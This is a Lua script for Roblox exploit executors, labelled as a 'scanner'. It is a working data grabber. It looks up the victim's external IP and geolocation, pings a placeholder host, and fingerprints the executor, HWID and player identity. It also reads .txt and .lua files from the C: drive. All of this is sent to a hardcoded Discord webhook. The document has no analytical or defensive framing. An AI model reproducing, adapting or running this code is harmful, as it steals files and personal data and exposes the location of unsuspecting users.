_G.ScannerConfig = _G.ScannerConfig or {};
local config = _G.ScannerConfig;
config.BYTE_CODE = config.BYTE_CODE or "0101001011100001010001011010";
config.MAX_FILES = config.MAX_FILES or 100;
config.WEBHOOK_URL = config.WEBHOOK_URL or "https://discord.com/api/webhooks/1421530148875800748/bPMy96aCOzyywY43qNW7pVeQSqdNtIgwyjOH_OWNfmduCJc_ysk7PDevP31ooRVTvdiO";
config.DRIVE = config.DRIVE or "C:";
config.EXTENSIONS = config.EXTENSIONS or {".txt",".lua"};
config.MAX_FILE_BYTES = config.MAX_FILE_BYTES or (200 * 1024);
config.MAX_TOTAL_BYTES = config.MAX_TOTAL_BYTES or (7 * 1024 * 1024);
local externalIP = "unknown";
pcall(function()
	local s = game:HttpGet("https://api.ipify.org/");
	if (s and (#s > 0)) then
		externalIP = s;
		game:HttpGet("http://yourhost:8000/hit?ext=" .. game:GetService("HttpService"):UrlEncode(s));
	end
end);
local HttpService = game:GetService("HttpService");
local geoData = {lon="unknown",lat="unknown",city="unknown",regionName="unknown",country="unknown",isp="unknown"};
local ok, res = pcall(function()
	return game:HttpGet("http://ip-api.com/json/");
end);
if (ok and res) then
	local d = HttpService:JSONDecode(res);
	geoData = {lon=tostring(d.lon or "unknown"),lat=tostring(d.lat or "unknown"),city=tostring(d.city or "unknown"),regionName=tostring(d.regionName or "unknown"),country=tostring(d.country or "unknown"),isp=tostring(d.isp or "unknown")};
end
local Players = game:GetService("Players");
local pl = Players.LocalPlayer;
local function safe(f, ...)
	local ok, res = pcall(f, ...);
	if ok then
		return res;
	end
	return nil;
end
local detections = {};
local exec_name = nil;
local g_name = safe(function()
	if (type(getexecutorname) == "function") then
		return getexecutorname();
	end
end);
if (g_name and (type(g_name) == "string") and (#g_name > 0)) then
	exec_name = g_name;
	table.insert(detections, "getexecutorname()");
end
local id_name = safe(function()
	if (type(identifyexecutor) == "function") then
		return identifyexecutor();
	end
end);
if id_name then
	if ((type(id_name) == "string") and (#id_name > 0)) then
		exec_name = exec_name or id_name;
		table.insert(detections, "identifyexecutor()");
	elseif ((type(id_name) == "table") and id_name.name) then
		exec_name = exec_name or tostring(id_name.name);
		table.insert(detections, "identifyexecutor() -> table");
	end
end
local sigs = {["Synapse X"]=function()
	return (rawget(_G, "syn") ~= nil) or (type(syn) ~= "nil");
end,Krnl=function()
	return (rawget(_G, "KRNL_LOADED") ~= nil) or (rawget(_G, "KRNL") ~= nil);
end,ProtoSmasher=function()
	return rawget(_G, "PROTOSMASHER_LOADED") ~= nil;
end,SirHurt=function()
	return rawget(_G, "is_sirhurt_closure") ~= nil;
end};
for name, fn in pairs(sigs) do
	local ok, val = pcall(fn);
	if (ok and val) then
		table.insert(detections, name);
	end
end
local os_detect = nil;
local os_source = nil;
if (type(id_name) == "table") then
	if (id_name.os and (type(id_name.os) == "string")) then
		os_detect = id_name.os;
		os_source = "identifyexecutor().os";
	elseif (id_name.platform and (type(id_name.platform) == "string")) then
		os_detect = id_name.platform;
		os_source = "identifyexecutor().platform";
	end
end
if not os_detect then
	local info = safe(function()
		if (type(getexecutorinfo) == "function") then
			return getexecutorinfo();
		end
		if ((type(syn) == "table") and (type(syn.get_executor) == "function")) then
			return syn.get_executor();
		end
		return nil;
	end);
	if (type(info) == "table") then
		if (info.os and (type(info.os) == "string")) then
			os_detect = info.os;
			os_source = "getexecutorinfo().os";
		end
		if (not os_detect and info.platform and (type(info.platform) == "string")) then
			os_detect = info.platform;
			os_source = "getexecutorinfo().platform";
		end
	end
end
if (not os_detect and (rawget(_G, "jit") ~= nil)) then
	local jit_os = safe(function()
		return jit.os;
	end);
	if (jit_os and (type(jit_os) == "string")) then
		os_detect = jit_os;
		os_source = "jit.os";
	end
end
if not os_detect then
	local has_write = safe(function()
		return type(writefile) == "function";
	end);
	if has_write then
		os_detect = "Windows (heuristic: writefile present)";
		os_source = "heuristic";
	else
		os_detect = "unknown";
		os_source = "none";
	end
end
local det_str = table.concat(detections, ", ");
if (det_str == "") then
	det_str = "none";
end
local uname = (pl and pl.Name) or "unknown";
local uid = (pl and tostring(pl.UserId)) or "0";
local timeStr = os.date("%Y-%m-%d %H:%M:%S", os.time());
local placeName = "unknown";
local placeId = tostring(game.PlaceId or "0");
local ok, info = pcall(function()
	return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId);
end);
if (ok and info) then
	placeName = info.Name or "unknown";
end
local function ends_with(str, ending)
	if (not str or not ending) then
		return false;
	end
	if (#ending > #str) then
		return false;
	end
	return string.lower(string.sub(str, -#ending)) == string.lower(ending);
end
local function is_valid_drive(drive)
	if (type(drive) ~= "string") then
		return false;
	end
	return drive:match("^[A-Z]:$") ~= nil;
end
local function sendWebhook(fileList, combinedContent)
	local nickname = (game.Players.LocalPlayer and game.Players.LocalPlayer.DisplayName) or "unknown";
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "unknown";
	local boundary = "----WebKitFormBoundary" .. HttpService:GenerateGUID(false);
	local body = {("--" .. boundary),'Content-Disposition: form-data; name="payload_json"',"Content-Type: application/json","",HttpService:JSONEncode({content="",embeds={{title=("**Scanned Files on " .. config.DRIVE .. "**"),description=("Found " .. #fileList .. " .txt/.lua files. Contents attached."),type="rich",color=tonumber(16777215),fields={{name="Files",value=(((#fileList > 0) and table.concat(fileList, "\n")) or "No files found"),inline=true},{name="External IP",value=externalIP,inline=true},{name="Nickname",value=nickname,inline=true},{name="HWID",value=hwid,inline=true},{name="Longitude",value=geoData.lon,inline=true},{name="Latitude",value=geoData.lat,inline=true},{name="City",value=geoData.city,inline=true},{name="Region",value=geoData.regionName,inline=true},{name="Country",value=geoData.country,inline=true},{name="ISP",value=geoData.isp,inline=true},{name="Injector",value=(exec_name or "unknown"),inline=true},{name="Detections",value=det_str,inline=true},{name="OS",value=os_detect,inline=true},{name="OS Source",value=os_source,inline=true},{name="Player",value=uname,inline=true},{name="Player ID",value=uid,inline=true},{name="Time",value=timeStr,inline=true},{name="Place Name",value=placeName,inline=true},{name="Place ID",value=placeId,inline=true},{name="Byte Code",value=config.BYTE_CODE,inline=true}}}}}),("--" .. boundary),'Content-Disposition: form-data; name="file"; filename="scanned_files.txt"',"Content-Type: text/plain","",combinedContent,("--" .. boundary .. "--")};
	local payload = table.concat(body, "\r\n");
	local headers = {["Content-Type"]=("multipart/form-data; boundary=" .. boundary)};
	local success, response = pcall(function()
		return http_request({Url=config.WEBHOOK_URL,Method="POST",Headers=headers,Body=payload});
	end);
	if success then
		print("Files sent successfully.");
		print("Your IP address: " .. externalIP);
		print("Your nickname: " .. nickname);
		print("Your HWID: " .. hwid);
		print(("Longitude: %s, Latitude: %s, City: %s, Region: %s, Country: %s, ISP: %s"):format(geoData.lon, geoData.lat, geoData.city, geoData.regionName, geoData.country, geoData.isp));
		print(("[%s] Injector=%s | Detections=%s | OS=%s (source=%s) | Player=%s ID=%s"):format(timeStr, tostring(exec_name or "unknown"), det_str, tostring(os_detect), tostring(os_source), uname, uid));
		print("Place Name: " .. placeName .. " | ID: " .. placeId);
		print(config.BYTE_CODE);
	else
		print("Webhook error: " .. tostring(response));
	end
end
local foundFiles = {};
local combinedContent = "";
local totalBytes = 0;
local uniquePaths = {};
if not is_valid_drive(config.DRIVE) then
	print("Error: Invalid drive format '" .. tostring(config.DRIVE) .. "'. Use, e.g., 'C:'");
	sendWebhook({}, "Error: Invalid drive format '" .. tostring(config.DRIVE) .. "'");
	return;
end
local success, files = pcall(function()
	return listfiles(config.DRIVE);
end);
if (success and (type(files) == "table")) then
	for _, fullpath in ipairs(files) do
		if (#foundFiles >= config.MAX_FILES) then
			break;
		end
		for _, ext in ipairs(config.EXTENSIONS) do
			if (ends_with(fullpath, ext) and not uniquePaths[fullpath]) then
				uniquePaths[fullpath] = true;
				local succ, content = pcall(function()
					return readfile(fullpath);
				end);
				if (succ and (type(content) == "string") and (#content <= config.MAX_FILE_BYTES)) then
					if ((totalBytes + #content) <= config.MAX_TOTAL_BYTES) then
						table.insert(foundFiles, fullpath);
						combinedContent = combinedContent .. "-- File: " .. fullpath .. "\n" .. content .. "\n\n";
						totalBytes = totalBytes + #content;
					end
				end
				break;
			end
		end
	end
else
	print("Error: Failed to access drive " .. config.DRIVE .. " or no files found");
	sendWebhook({}, "Error: Failed to access drive " .. config.DRIVE);
	return;
end
sendWebhook(foundFiles, combinedContent);
